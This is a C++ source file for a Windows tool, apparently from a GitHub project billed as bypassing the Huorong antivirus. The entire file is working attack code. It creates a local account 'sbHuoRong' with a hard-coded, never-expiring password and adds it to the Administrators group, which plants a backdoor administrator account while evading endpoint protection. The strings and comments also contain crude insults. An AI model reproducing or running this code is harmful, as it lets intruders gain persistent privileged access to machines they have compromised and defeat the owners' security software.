/*************************************
//bypass 火绒添加用户
**************************************/
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <lm.h>
#include <stdio.h>
#include <ctime>
#pragma comment(lib, "netapi32.lib")//链接系统静态库

//函数申明
int AddUser(LPWSTR username_args, LPWSTR password_args);
int AddLocalGroupAdministrators(LPWSTR user);
int UserExists(LPWSTR userName);
void GetSystemTime();

HANDLE consolehwnd;//创建控制台句柄 实现输出绿色字体
int main(int argc, char* args[])
{
	consolehwnd=GetStdHandle(STD_OUTPUT_HANDLE);//实例化句柄
    const wchar_t* username = L"sbHuoRong";//添加的用户名 const wchar_t* 宽字节常指针类型
    const wchar_t* password = L"admin@Fuck748";//添加的密码 const wchar_t* 宽字节常指针类型
    // 将 const wchar_t* 转换为 LPWSTR
    wchar_t* usernameWritable = const_cast<wchar_t*>(username);//强转为LPWSTR类型
    wchar_t* passwordWritable = const_cast<wchar_t*>(password);//强转为LPWSTR类型
    //先判断sbHuoRong 这个用户是否存在 不存在则进行添加，存在则给出提示！
    int code = UserExists(usernameWritable);
    switch (code)
    {
    case 200:
        //存在则给出提示
        GetSystemTime();//获取系统时间
		printf("[+] https://github.com/0x6C696A756E/bypass_HuoRong_addUser\n");
		SetConsoleTextAttribute(consolehwnd,FOREGROUND_RED);//设置红色
		printf("The user sbHuoRong already exists！\n");//此处为红色字体
		SetConsoleTextAttribute(consolehwnd, 7); // 恢复控制台默认颜色
        break;
    case 404:
        //不存在
         //添加用户名和密码
        GetSystemTime();//获取系统时间
        AddUser(usernameWritable, passwordWritable);
        //把用户添加到管理员组
        AddLocalGroupAdministrators(usernameWritable);
        break;
    case 500:
        //其他错误
        GetSystemTime();//获取系统时间
		SetConsoleTextAttribute(consolehwnd,FOREGROUND_RED);//设置字体红色
		printf("[+] https://github.com/0x6C696A756E/bypass_HuoRong_addUser\n");
		printf("Other errors！\n");//此处为红色字体
		SetConsoleTextAttribute(consolehwnd, 7); // 恢复控制台默认颜色
        break;
    }
	return 0;
}

//添加用户名和密码方法
int AddUser(LPWSTR username_args, LPWSTR password_args) {
    USER_INFO_1 userInfo;//声明结构体
    DWORD level = 1;
    DWORD error = 0;
    // 设置结构体用户信息 
    userInfo.usri1_name = username_args; // 用户名
    userInfo.usri1_password = password_args; // 密码
    userInfo.usri1_priv = USER_PRIV_USER; // 用户权限，这里设置为普通用户
    userInfo.usri1_home_dir = NULL; // 用户主目录，默认为 NULL
    userInfo.usri1_comment = NULL; // 用户备注，默认为 NULL
    userInfo.usri1_flags = UF_DONT_EXPIRE_PASSWD;// 用户标志这里设置为密码永不过期
    // 添加用户
    NET_API_STATUS result = NetUserAdd(NULL, level, (LPBYTE)&userInfo, &error);
    if (result == NERR_Success)
    {
		SetConsoleTextAttribute(consolehwnd,FOREGROUND_INTENSITY|FOREGROUND_GREEN);//设置绿色
		//此处为绿色字体
		printf("[+] https://github.com/0x6C696A756E/bypass_HuoRong_addUser\n");
		printf("[+] Supports all versions of Windows XP - Windows 10\n");
		printf("[+] Add User Successful！\n");
        printf("[+] Username is -> sbHuoRong\n");
        printf("[+] Password is -> admin@Fuck748\n");
        printf("[+] Password never expires！\n");
		SetConsoleTextAttribute(consolehwnd, 7); // 恢复控制台默认颜色
    }
    else
    {
		SetConsoleTextAttribute(consolehwnd,FOREGROUND_RED);//设置字体红色
		//此处为红色字体
		printf("[+] https://github.com/0x6C696A756E/bypass_HuoRong_addUser\n");
		printf("!!! Add User Error!，Code：%d\n", result);
		SetConsoleTextAttribute(consolehwnd, 7); // 恢复控制台默认颜色
    }
    return 0;
}

//把用户添加到管理员组
int AddLocalGroupAdministrators(LPWSTR user) {
    // 将用户添加到管理员组
    LOCALGROUP_MEMBERS_INFO_3 members;
    members.lgrmi3_domainandname = user;
    DWORD  result = NetLocalGroupAddMembers(NULL, L"Administrators", 3, reinterpret_cast<LPBYTE>(&members), 1);
    if (result == NERR_Success) {
        // 用户添加到管理员组成功
		SetConsoleTextAttribute(consolehwnd,FOREGROUND_INTENSITY|FOREGROUND_GREEN);//设置绿色
		printf("[+] Add User sbHuoRong to administrators Successful！\n");//此处为绿色字体
		SetConsoleTextAttribute(consolehwnd, 7); // 恢复控制台默认颜色
    }
    else {
        // 用户添加到管理员组失败
		SetConsoleTextAttribute(consolehwnd,FOREGROUND_RED);//设置字体红色
		//此处为红色字体
		printf("!!! Add LocalGroup Error!，Code：%d\n", result);
		SetConsoleTextAttribute(consolehwnd, 7); // 恢复控制台默认颜色
    }
    return 0;
}

//判断sbHuoRong 用户是否存在
int UserExists(LPWSTR userName) {
    USER_INFO_1* userInfo = NULL;
    DWORD dwLevel = 1;
    DWORD dwError = 0;
    // Get user info
    dwError = NetUserGetInfo(NULL, userName, dwLevel, (LPBYTE*)&userInfo);
    if (dwError == NERR_UserNotFound) {
        // User does not exist 不存在
        return 404;
    }
    else if (dwError == NERR_Success) {
        // User exists 存在
        return 200;
    }
    else {
        // Error 其他错误
        return 500;
    }
    NetApiBufferFree(userInfo);//指针释放
}


//获取系统时间
void GetSystemTime() {
    time_t now = time(0);
    char timestamp[80];
    struct tm tstruct;
    tstruct = *localtime(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", &tstruct);
    printf("[+] %s\n", timestamp);
}